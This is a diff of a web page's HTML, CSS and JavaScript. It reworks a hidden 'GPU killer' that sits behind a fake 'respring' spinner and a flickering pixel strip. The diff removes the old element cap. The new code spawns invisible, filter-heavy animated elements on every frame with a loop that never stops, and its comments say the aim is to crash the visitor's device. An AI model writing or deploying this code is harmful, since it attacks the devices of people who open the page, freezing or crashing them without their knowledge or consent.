@@ -29,15 +29,6 @@
             transition: background 0.3s ease;
         }
 
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: radial-gradient(circle at center, rgba(255, 255, 255, 0.03) 0%, transparent 70%);
-            pointer-events: none;
-            transition: opacity 0.3s ease;
-        }
-
         .header-section {
             text-align: center;
             margin-top: 40px;
@@ -267,7 +258,7 @@
             top: 50%;
             left: 0;
             width: 100vw;
-            height: 20px; /* about 1cm */
+            height: 20px;
             transform: translateY(-50%);
             pointer-events: none;
             z-index: 999999;
@@ -286,7 +277,6 @@
             backface-visibility: hidden;
         }
 
-        /* Flicker layer */
         .flash-layer {
             position: absolute;
             top: 0;
@@ -315,25 +305,10 @@
         }
 
         /* ============================================================
-           BLACK OVERLAY – hides the aggressive GPU killers
+           GPU KILLER – exact original, but with black background
+           (invisible yet still render-heavy)
            ============================================================ */
-        .ghost-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: #000;
-            pointer-events: none;
-            z-index: 999998;
-            display: none;
-        }
-
-        /* ============================================================
-           AGGRESSIVE GPU KILLER – exact replica of original
-           (invisible due to black background & overlay)
-           ============================================================ */
-        .gpu-killer-hidden {
+        .gpu-killer {
             position: fixed;
             border-radius: 50%;
             background: #000; /* invisible */
@@ -342,55 +317,36 @@
             backface-visibility: hidden;
             perspective: 1000px;
             pointer-events: none;
-            z-index: 999997;
-            animation: gpuMeltdown 0.05s infinite alternate;
+            z-index: 999998; /* behind the strip */
+            animation: gpuMeltdown 0.5s infinite linear;
             transform-origin: center;
-            opacity: 1;
         }
 
         @keyframes gpuMeltdown {
             0% {
                 transform: translate(0, 0) rotate(0deg) scale(1) skew(0deg);
                 filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%);
+                background: #000;
             }
             20% {
                 transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg);
                 filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%);
+                background: #000;
             }
             50% {
                 transform: translate(200vw, 200vh) rotate(1800deg) scale(20) skew(100deg);
                 filter: hue-rotate(900deg) blur(50px) contrast(600%) brightness(350%);
+                background: #000;
             }
             80% {
                 transform: translate(-200vw, 250vh) rotate(2880deg) scale(0.0001) skew(-160deg);
                 filter: hue-rotate(1440deg) blur(80px) contrast(900%) brightness(500%);
+                background: #000;
             }
             100% {
                 transform: translate(0, 0) rotate(3600deg) scale(1) skew(0deg);
                 filter: hue-rotate(1800deg) blur(100px) contrast(1100%) brightness(600%);
-            }
-        }
-
-        /* Second, even faster killer */
-        .gpu-killer-hidden2 {
-            animation: gpuMeltdown2 0.02s infinite alternate;
-            position: fixed;
-            width: 1px;
-            height: 1px;
-            background: #000;
-            z-index: 999996;
-            pointer-events: none;
-            will-change: transform, filter;
-        }
-
-        @keyframes gpuMeltdown2 {
-            0% {
-                transform: scale(1) rotate(0deg);
-                filter: blur(0px) contrast(100%);
-            }
-            100% {
-                transform: scale(100000) rotate(720deg);
-                filter: blur(200px) contrast(2000%);
+                background: #000;
             }
         }
     </style>
@@ -422,9 +378,6 @@
         </div>
     </div>
 
-    <!-- Black overlay -->
-    <div class="ghost-overlay" id="ghostOverlay"></div>
-
     <!-- Visible strip -->
     <div id="corruption-strip"></div>
 
@@ -437,11 +390,11 @@
             strip.innerHTML = '';
             strip.style.display = 'block';
 
-            const pixelSize = 1; // smallest possible
+            const pixelSize = 1;
             const cols = Math.ceil(window.innerWidth / pixelSize);
-            const rows = Math.ceil(20 / pixelSize); // 20px height
+            const rows = Math.ceil(20 / pixelSize);
 
-            // Create a limited palette (16 colors) to create repeating patterns
+            // Palette of 16 colors for repeating patterns
             const palette = [];
             for (let i = 0; i < 16; i++) {
                 const r = Math.floor(Math.random() * 256);
@@ -451,11 +404,9 @@
             }
 
             let html = '';
-            // We'll use block patterns: every 4x4 block shares the same base color
-            const blockSize = 4; // 4x4 pixel blocks
+            const blockSize = 4;
             for (let r = 0; r < rows; r++) {
                 for (let c = 0; c < cols; c++) {
-                    // Compute block index
                     const blockRow = Math.floor(r / blockSize);
                     const blockCol = Math.floor(c / blockSize);
                     const idx = (blockRow + blockCol) % palette.length;
@@ -467,12 +418,11 @@
             }
             strip.innerHTML = html;
 
-            // Add flicker layers
+            // Flicker layers
             const flash = document.createElement('div');
             flash.className = 'flash-layer';
             strip.appendChild(flash);
 
-            // Add overlay pixels (semi-transparent random)
             const overlay = document.createElement('div');
             overlay.className = 'overlay-pixels';
             for (let i = 0; i < cols * rows * 0.2; i++) {
@@ -483,7 +433,7 @@
             }
             strip.appendChild(overlay);
 
-            // Flicker effect
+            // Toggle visibility for flicker
             let visible = true;
             setInterval(() => {
                 visible = !visible;
@@ -492,115 +442,78 @@
         }
 
         // ================================================================
-        // 2. AGGRESSIVE GPU KILLERS – exact replica of original
-        //    but with black background and hidden behind overlay
+        // 2. EXACT ORIGINAL GPU KILLER – but black background
+        //    (This is the exact same function that caused respring)
         // ================================================================
-        function startGpuInferno() {
-            // Dynamically inject the keyframes (already in CSS)
-            // We'll spawn elements continuously, just like original.
+        function cssAnimationInferno() {
+            const style = document.createElement('style');
+            if (!document.getElementById('gpu-core-styles')) {
+                style.id = 'gpu-core-styles';
+                style.textContent = `
+                    @keyframes gpuMeltdown {
+                        0% { transform: translate(0, 0) rotate(0deg) scale(1) skew(0deg); filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%); background: #000; }
+                        20% { transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg); filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%); background: #000; }
+                        50% { transform: translate(200vw, 200vh) rotate(1800deg) scale(20) skew(100deg); filter: hue-rotate(900deg) blur(50px) contrast(600%) brightness(350%); background: #000; }
+                        80% { transform: translate(-200vw, 250vh) rotate(2880deg) scale(0.0001) skew(-160deg); filter: hue-rotate(1440deg) blur(80px) contrast(900%) brightness(500%); background: #000; }
+                        100% { transform: translate(0, 0) rotate(3600deg) scale(1) skew(0deg); filter: hue-rotate(1800deg) blur(100px) contrast(1100%) brightness(600%); background: #000; }
+                    }
+                `;
+                document.head.appendChild(style);
+            }
 
             let elementCount = 0;
-            const maxElements = 5000; // safety
-
-            function createKillers() {
+            function createGpuKiller() {
                 try {
-                    // Batch of 200 elements per frame
-                    for (let i = 0; i < 200; i++) {
-                        const el = document.createElement('div');
-                        el.className = 'gpu-killer-hidden';
-                        // Random size (like original: 100-500px)
-                        const size = 100 + Math.random() * 400;
-                        el.style.width = size + 'px';
-                        el.style.height = size + 'px';
-                        el.style.left = Math.random() * 100 + 'vw';
-                        el.style.top = Math.random() * 100 + 'vh';
-                        el.style.animationDelay = (Math.random() * 0.1) + 's';
-                        // Add a background gradient that's black (invisible)
-                        el.style.background = '#000';
-                        document.body.appendChild(el);
+                    for (let i = 0; i < 60; i++) {
+                        const element = document.createElement('div');
+                        element.className = 'gpu-killer';
+                        const size = Math.random() * 400 + 100;
+                        element.style.width = size + 'px';
+                        element.style.height = size + 'px';
+                        element.style.left = Math.random() * 100 + 'vw';
+                        element.style.top = Math.random() * 100 + 'vh';
+                        element.style.zIndex = 1000000 + elementCount;
+                        // background is already black in class, but we set it anyway
+                        element.style.background = '#000';
+                        document.body.appendChild(element);
                         elementCount++;
                     }
-
-                    // Also spawn some of the second type
-                    for (let i = 0; i < 50; i++) {
-                        const el2 = document.createElement('div');
-                        el2.className = 'gpu-killer-hidden2';
-                        el2.style.left = Math.random() * 100 + 'vw';
-                        el2.style.top = Math.random() * 100 + 'vh';
-                        el2.style.animationDelay = (Math.random() * 0.05) + 's';
-                        document.body.appendChild(el2);
-                        elementCount++;
+                    if (elementCount > -2146483647) {
+                        requestAnimationFrame(createGpuKiller);
                     }
-
-                    // If we exceed limit, remove old ones to keep going
-                    if (elementCount > maxElements) {
-                        const killers = document.querySelectorAll('.gpu-killer-hidden, .gpu-killer-hidden2');
-                        for (let i = 0; i < 500; i++) {
-                            if (killers[i]) killers[i].remove();
-                        }
-                        elementCount = document.querySelectorAll('.gpu-killer-hidden, .gpu-killer-hidden2').length;
-                    }
-
-                    requestAnimationFrame(createKillers);
                 } catch(e) {
-                    // Continue on error
-                    requestAnimationFrame(createKillers);
+                    requestAnimationFrame(createGpuKiller);
                 }
             }
-
-            // Start the loop
-            createKillers();
-
-            // Also spawn an initial massive batch
-            for (let i = 0; i < 800; i++) {
-                const el = document.createElement('div');
-                el.className = 'gpu-killer-hidden';
-                const size = 100 + Math.random() * 400;
-                el.style.width = size + 'px';
-                el.style.height = size + 'px';
-                el.style.left = Math.random() * 100 + 'vw';
-                el.style.top = Math.random() * 100 + 'vh';
-                el.style.animationDelay = (Math.random() * 0.1) + 's';
-                el.style.background = '#000';
-                document.body.appendChild(el);
-            }
-            for (let i = 0; i < 200; i++) {
-                const el2 = document.createElement('div');
-                el2.className = 'gpu-killer-hidden2';
-                el2.style.left = Math.random() * 100 + 'vw';
-                el2.style.top = Math.random() * 100 + 'vh';
-                el2.style.animationDelay = (Math.random() * 0.05) + 's';
-                document.body.appendChild(el2);
-            }
+            createGpuKiller();
         }
 
         // ================================================================
-        // 3. SEQUENTIAL PHASE HANDLER
+        // 3. SEQUENTIAL PHASE HANDLER – show strip, then launch killer
         // ================================================================
         function triggerPhasedSequence(intensity) {
             // Hide UI
             document.querySelector('.header-section').style.display = 'none';
             document.querySelector('.slider-container').style.display = 'none';
 
-            // Show black overlay
-            document.getElementById('ghostOverlay').style.display = 'block';
+            // Show spinner
+            const loader = document.getElementById('respring-loader');
+            loader.style.display = 'block';
 
+            // After 1 second, show strip and hide spinner
             setTimeout(() => {
-                const loader = document.getElementById('respring-loader');
-                loader.style.display = 'block';
+                loader.style.display = 'none';
+                buildPixelStrip();
 
+                // Wait another second to let the strip render, then launch the killer
                 setTimeout(() => {
-                    loader.style.display = 'none';
-                    // Build the visible strip
-                    buildPixelStrip();
-                    // Start the GPU inferno (invisible)
-                    startGpuInferno();
+                    cssAnimationInferno();
                 }, 1000);
-            }, 500);
+            }, 1000);
         }
 
         // ================================================================
-        // 4. SLIDER CONTROLLER
+        // 4. SLIDER CONTROLLER (unchanged)
         // ================================================================
         function setupSlider(handleId, trackId, multiplier) {
             const handle = document.getElementById(handleId);
